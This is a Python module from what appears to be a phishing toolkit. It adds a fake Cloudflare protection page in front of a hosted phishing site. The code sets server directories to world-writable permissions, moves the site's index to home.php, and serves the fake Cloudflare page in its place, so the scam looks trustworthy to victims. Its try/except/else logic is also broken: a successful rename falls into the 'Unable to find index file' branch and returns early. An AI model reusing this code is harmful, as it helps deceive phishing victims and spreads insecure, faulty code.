from Defs.ImportManager.unsorted_will_be_replaced import wait, run_command, pathlib_Path, replace, copyfile, chmod
import Defs.ThemeManager.theme as theme

default_palette = theme.default_palette

def add_cloudflare_prompt():

    run_command('clear')
    print('''{1}
    #	    ████████                ██          ████████                 
    #	  ██░░░░░░██              ░██          ░██░░░░░   ██   ██        
    #	 ██      ░░   ██████      ░██  ██████  ░██       ░░██ ██   █████ 
    #	░██          ██░░░░██  ██████ ██░░░░   ░███████   ░░███   ██░░░██
    #	░██    █████░██   ░██ ██░░░██░░█████   ░██░░░░     ░██   ░███████
    #	░░██  ░░░░██░██   ░██░██  ░██ ░░░░░██  ░██         ██    ░██░░░░ 
    #	 ░░████████ ░░██████ ░░██████ ██████   ░████████  ██     ░░██████
    #	  ░░░░░░░░   ░░░░░░   ░░░░░░ ░░░░░░    ░░░░░░░░  ░░       ░░░░░░  
        {1}http://github.com/FakeSmileUX
        {0}** By: {1}FakeSmile {0}**'''.format(default_palette[0], default_palette[2]))
    print("-------------------------------\n{0}[ Cloudflare Protection Prompt ]{1}!! {0}\n-------------------------------".format(default_palette[0], default_palette[4]))
    print("\n{0}[{1}*{0}]{0}Do You Want To Add A Cloudflare Protection Fake Page -{1}(Y/N)".format(default_palette[0], default_palette[4]))
    choice = input("\n\n{0}Your Choice >>> {1}".format(default_palette[0], default_palette[2])).upper()
    if choice == 'Y':
        add_cloudfare()
    else:
        wait(1)


def add_cloudfare():
    #run_command('mv Server/www/index.* Server/www/home.php &
    # & cp WebPages/cloudfare.html Server/www/index.html')
    chmod('Server', 0o777)
    chmod('Server/www', 0o777)
    try:
        replace('Server/www/index.php', 'Server/www/home.php')
    except:
        replace('Server/www/index.html', 'Server/www/home.php')
    else:
        print('Unable to find index file, skipping...')
        return
    copyfile('WebPages/cloudflare.html', 'Server/www/index.html')
    print("\n{0}[{1}#{0}]CLOUDFARE FAKE PAGE{0} ADDED...".format(default_palette[0], default_palette[4]))
    wait(1)

